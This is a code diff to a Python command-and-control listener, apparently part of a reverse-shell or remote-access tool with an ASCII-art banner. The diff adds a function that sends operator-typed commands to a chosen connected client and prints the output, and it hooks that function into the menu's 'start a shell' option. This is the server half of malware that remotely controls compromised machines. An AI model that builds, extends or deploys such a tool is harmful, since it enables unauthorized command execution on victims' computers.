@@ -2,7 +2,7 @@
 import socket
 import sys
 import threading
-import time
+import os
 
 client_list = []
 BUFFER_SIZE = 1024 * 128
@@ -64,6 +64,29 @@ def removeClient():
             clear()
             return "\nError: Could Not Remove Client\n"
 
+def shell(conn):
+    try:
+        while True:
+            command = input(f"shell > ")
+            if command.lower() == "exit":
+                break
+            conn.send(command.encode())
+            output = conn.recv(BUFFER_SIZE).decode()
+            print(output)
+    except Exception as e:
+        print(f"Error: {e}")
+        
+# def handle_client(conn):
+#     # handle cd command separately
+#     while True:
+#         command = input(f"shell > ")
+#         if command.lower() == "exit":
+#             break
+#         conn.send(command.encode())
+#         output = conn.recv(BUFFER_SIZE).decode()
+#         print(output)
+    
+
 def main(HOST, PORT):
     isRunning = True
     menu = True
@@ -75,8 +98,9 @@ def main(HOST, PORT):
 \____|__  / |__|_ \  |__|    (____  / /____  > |__| (____  / 
         \/       \/               \/       \/            \/  
 """)
-    threading.Thread(target=startListener, args=(HOST, PORT)).start()
-    
+    listener = threading.Thread(target=startListener, args=(HOST, PORT))
+    listener.start()
+
     print(f"""                             
 Listening: {HOST} : {PORT}\n 
 """)
@@ -104,12 +128,14 @@ Listening: {HOST} : {PORT}\n
             selectedClientStr = input("To Start A Shell, Type In The Client Number: ")
             selectedClient = int(selectedClientStr)
             x = client_list[selectedClient - 1]
+            shell(x)
             
         elif option == "X":
             isRunning = False
             for client in client_list:
                 client.close()
             print("Exiting\n")
+            
         else:
             clear()
             print("Invalid Option\n")
